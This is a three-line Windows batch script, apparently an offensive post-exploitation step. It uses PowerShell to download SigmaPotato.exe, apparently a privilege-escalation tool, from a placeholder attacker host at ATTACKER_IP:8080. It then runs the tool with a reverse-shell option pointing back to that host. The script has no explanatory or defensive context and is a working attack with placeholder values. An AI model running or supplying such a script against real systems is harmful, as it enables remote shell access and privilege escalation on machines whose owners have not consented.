@echo off
powershell -Command "Invoke-WebRequest -Uri http://ATTACKER_IP:8080/SigmaPotato.exe -OutFile SigmaPotato.exe"
SigmaPotato.exe --revshell ATTACKER_IP PORT
